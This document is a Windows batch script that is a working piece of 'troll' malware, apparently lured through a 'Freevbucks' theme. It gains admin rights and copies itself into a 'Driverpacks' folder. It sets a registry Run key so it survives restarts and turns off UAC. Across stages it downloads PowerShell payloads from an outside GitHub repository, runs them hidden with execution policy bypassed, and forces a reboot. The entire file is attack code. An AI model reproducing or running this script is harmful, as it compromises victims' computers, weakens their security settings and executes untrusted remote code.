@echo off
setlocal ENABLEEXTENSIONS
set SEE_MASK_NOZONECHECKS=1

:: 1. ADMIN CHECK
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. CONFIGURATION
set "TargetFolder=%USERPROFILE%\Driverpacks"
set "TargetFile=%TargetFolder%\Mouse.bat"
set "Key=HKCU\Software\Freevbucks"

:: 3. PERSISTENCE & UNBLOCKING
if /i "%~f0" neq "%TargetFile%" (
    if not exist "%TargetFolder%" mkdir "%TargetFolder%"
    copy "%~f0" "%TargetFile%" /Y >nul
    powershell -Command "Unblock-File -Path '%TargetFile%'"
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Driverpacks" /t REG_SZ /d "\"%TargetFile%\"" /f >nul
    start "" "%TargetFile%"
    exit /b
)

:: 4. STAGE DETECTION
reg query "%Key%" /v "Stage" >nul 2>&1
if errorlevel 1 reg add "%Key%" /v "Stage" /t REG_DWORD /d 1 /f >nul

for /f "tokens=3" %%A in ('reg query "%Key%" /v "Stage" ^| findstr "Stage"') do set /a currentStage=%%A

:: --- STAGE 1: GDI MELT & REBOOT ---
if %currentStage%==1 (
    curl -L -s -o "%TargetFolder%\gdi.ps1" "https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/gdi.ps1"
    powershell -Command "Unblock-File -Path '%TargetFolder%\gdi.ps1'"
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul
    reg add "%Key%" /v "Stage" /t REG_DWORD /d 2 /f >nul
    
    :: Start GDI and wait 15 seconds before rebooting
    start /b powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\gdi.ps1"
    timeout /t 15
    shutdown /r /f /t 0
    exit /b
)

:: --- STAGE 2: THE AUDIO TROLL ---
if %currentStage%==2 (
    curl -L -s -o "%TargetFolder%\logic.ps1" "https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/troll_logic.ps1"
    powershell -Command "Unblock-File -Path '%TargetFolder%\logic.ps1'"
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\logic.ps1"
    exit /b
)
